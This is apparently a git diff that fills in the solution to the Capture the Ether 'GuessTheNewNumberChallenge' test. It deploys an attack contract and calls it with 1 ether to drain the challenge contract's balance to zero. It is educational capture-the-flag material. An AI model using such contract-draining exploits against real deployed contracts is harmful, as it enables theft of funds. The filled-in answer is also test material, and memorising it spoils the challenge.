@@ -6,11 +6,13 @@ const { utils, provider } = ethers;
 
 describe('GuessTheNewNumberChallenge', () => {
   let target: Contract;
+  let attackContract: Contract;
   let deployer: SignerWithAddress;
   let attacker: SignerWithAddress;
+  let exploiter: SignerWithAddress;
 
   before(async () => {
-    [attacker, deployer] = await ethers.getSigners();
+    [exploiter, attacker, deployer] = await ethers.getSigners();
 
     target = await (
       await ethers.getContractFactory('GuessTheNewNumberChallenge', deployer)
@@ -21,13 +23,19 @@ describe('GuessTheNewNumberChallenge', () => {
     await target.deployed();
 
     target = await target.connect(attacker);
+
+    attackContract = await (
+      await ethers.getContractFactory('AttackGuessTheNewNumber', exploiter)
+    ).deploy(target.address);
+    await attackContract.deployed();
+    
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
-
+    const tx = await attackContract.attack({
+      value: ethers.utils.parseEther(`1`),
+    });
+    
     expect(await provider.getBalance(target.address)).to.equal(0);
   });
 });
